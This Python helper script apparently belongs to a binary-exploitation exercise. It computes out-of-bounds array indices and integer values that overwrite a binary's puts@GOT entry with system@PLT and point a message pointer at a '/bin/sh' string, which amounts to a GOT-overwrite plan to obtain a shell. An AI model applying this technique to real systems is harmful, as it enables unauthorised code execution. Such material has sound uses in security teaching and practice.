#!/usr/bin/env python3
"""
Debug script to verify our calculations
"""

# Given addresses from binary analysis
values_base = 0x6010c0
puts_got = 0x601020
system_plt = 0x4006c0
msg_addr = 0x601068

print("=== Memory Layout ===")
print(f"values[0] base:  {hex(values_base)}")
print(f"puts@GOT:        {hex(puts_got)}")
print(f"system@PLT:      {hex(system_plt)}")
print(f"msg pointer:     {hex(msg_addr)}")

print("\n=== Offset Calculations (int array, 4 bytes each) ===")

# Check if puts@GOT is before or after values
offset_puts = (puts_got - values_base) // 4
print(f"puts@GOT offset: ({hex(puts_got)} - {hex(values_base)}) / 4 = {offset_puts}")
print(f"  → This means: values[{offset_puts}] overlaps with puts@GOT")

# Check msg offset
offset_msg = (msg_addr - values_base) // 4
print(f"msg offset:      ({hex(msg_addr)} - {hex(values_base)}) / 4 = {offset_msg}")
print(f"  → This means: values[{offset_msg}] overlaps with msg pointer")

# Verify with hex math
print("\n=== Verification ===")
print(f"values_base + (offset_puts * 4) = {hex(values_base + (offset_puts * 4))}")
print(f"Should equal puts@GOT = {hex(puts_got)}")
print(f"Match: {values_base + (offset_puts * 4) == puts_got}")

print(f"\nvalues_base + (offset_msg * 4) = {hex(values_base + (offset_msg * 4))}")
print(f"Should equal msg = {hex(msg_addr)}")
print(f"Match: {values_base + (offset_msg * 4) == msg_addr}")

import struct

print("\n=== String Values ===")
binsh1 = struct.unpack('<I', b'/bin')[0]
binsh2 = struct.unpack('<I', b'/sh\x00')[0]
print(f"'/bin' = {binsh1} = {hex(binsh1)}")
print(f"'/sh\\x00' = {binsh2} = {hex(binsh2)}")

print("\n=== Integer Values for Exploit ===")
print(f"values[0] = {binsh1}")
print(f"values[1] = {binsh2}")
print(f"values[{offset_msg}] = {values_base} (low 32-bit of values_base)")
print(f"values[{offset_msg + 1}] = 0 (high 32-bit)")
print(f"values[{offset_puts}] = {system_plt} (low 32-bit of system@PLT)")
print(f"values[{offset_puts + 1}] = 0 (high 32-bit)")
